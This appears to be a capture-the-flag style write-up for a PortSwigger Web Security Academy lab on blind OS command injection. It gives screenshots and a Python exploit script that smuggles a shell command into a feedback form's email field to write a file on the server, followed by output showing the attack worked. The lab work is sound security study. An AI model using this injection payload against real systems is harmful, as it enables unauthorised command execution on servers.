<img width="787" height="650" alt="image" src="https://github.com/user-attachments/assets/6348cef1-4ba4-4bfe-afcf-9c29769cdb38" />

<img width="1028" height="488" alt="image" src="https://github.com/user-attachments/assets/5d9cc545-47c7-41d7-9f49-640a724bcbb8" />

<img width="434" height="417" alt="image" src="https://github.com/user-attachments/assets/b9025048-9bc0-41a7-b83b-86520db03257" />

<img width="1370" height="813" alt="image" src="https://github.com/user-attachments/assets/cef6d6da-8cc6-4be9-8db5-3a9c484e9616" />

<img width="748" height="126" alt="image" src="https://github.com/user-attachments/assets/d7d9052c-e4c5-4892-8421-a261b34d10cc" />

``` python

import requests

url = "https://0a2200c80404813081df25c0009b00db.web-security-academy.net"
session = requests.Session()
session.cookies.set("session", "HxNkryzmKD5PBOrMVYpBccfMEY0bIuBi")

try:
    command = "|| echo 'you are pwned' > /var/www/images/pwned.txt ||"
    r = session.post(url + "/feedback/submit", data={"csrf":"KXYX4Tz4umTGt1ce2RaadrZ70Lmp8GKB", "name":"test", "email":f"x{command}", "subject":"test", "message":"test"})
    print(r.status_code)
    print(r.text)
    r2 = requests.get(url + "/image?filename=pwned.txt")
    print(r2.text)
    response = r2.text
    if "you are pwned" in response:
          print("[+] got it!")
    else:
         print("[-] Reto no conseguido")

except Exception as e:
       print(f"Error: {e}")

```

``` bash

❯ python3 exploit.py
200
{}
you are pwned

[+] got it!
╭─ ~/portswigger/os-command-injection/level3                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```
